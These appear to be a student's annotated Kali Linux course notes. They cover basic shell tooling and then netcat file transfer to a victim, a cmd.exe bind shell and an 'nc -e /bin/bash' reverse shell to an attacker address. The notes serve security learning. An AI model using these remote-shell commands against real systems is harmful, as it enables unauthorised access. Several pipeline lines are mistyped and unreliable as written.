#***************************************************************************
#**************** OFFENSIVE SECURITY WITH KALI LINUX ***********************
#***************************************************************************
#*************************** CHAPTER 1 *************************************
#***************************************************************************

# KALI MENU
updatedb							# builds a FileSystem's database

locate sbd.exe						# locates files in db
which sbd							# searches through $PATH-defined directories
find / -name sbd*					# searches recursively in any given path (most aggressive)


# KALI MANAGE
passwd								# Changes default kali password

service ssh start 					# Starting the SSH service
netstat -antp | grep sshd			# searches output for ssh

update-rc.d ssh enable				# starts automatically at boot time ssh service

service apache2 start 				# starts HTTP service


# BASH ENVIRONMENT
wget https://www.cisco.com			# downloads web page
ls -l index -html					# more details than ls

grep "href=" index.html | 			# take strings containing web urls
	cut -d "/" -f 3 | 				# delimiters = "/" then take the third field after delimiter
	grep "\." | 					# take strings containing "\."
	cut -d '"' -f 1 | 				# delimiters = " " then take first field after delimiter
	sort -u > list.txt				# sort results whithout repetitions, then write result in list.txt
	
	
for url in $(list.txt); do host $url; done			# for every url saved in list.txt, calculate IP
	grep "has address "	|							# interested only in "has address " lines to extract IP
	cut -d " " -f 4 | sort -u						# delimiters = " " then take fourth field, and sort. Here we have IPs!


head access.log						# prints first 10 lines of access.log
wc access.log						# returns line count

cat access.log | cut -d " " -f 1 |			# delimiters = " " then take first field
	sort | uniq -c |						# sort and count the occurencies of every IP request
  	sort -urn								# sort in unique (-u), reverse-order (-r), numeric-sort(-n)


#***************************************************************************
#*************************** CHAPTER 2 *************************************
#***************************************************************************

# ESSENTIAL TOOLS

nc -nv 10.0.0.22 110			# Netcat checks TCP port 110 is open on target (-nv : numeric IP no dns, verbose)

# FILE TRANS. server(vtm)
nc -nvlp 4444 > incoming.exe	# Receives exe file from any, on tcp port 4444 and rename it "incoming.exe
# FILE TRANS. client(atk)
locate wget.exe			
nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe
								# Sends wget.exe to victim

# BIND server(vtm):
nc -nlvp 4444 cmd.exe			# Bound TCP port 4444 to cmd.exe, so any IO from cmd.exe will be 
								# redirected to the network. This means client can use server's cmd.exe remotely
# BIND client(atk):
nc -nv 10.0.0.22 4444			# Client connects to server and is able to use cmd as server service provided					


# REVERSE SHELL server(atk)
nc -nvlp 4444					# Wait for victim connection
# REVERSE SHELL client(vtm)
nc -nv 10.0.0.22 4444 -e /bin/bash		# victim provides to attacker his shell (cmd.exe from windows)


























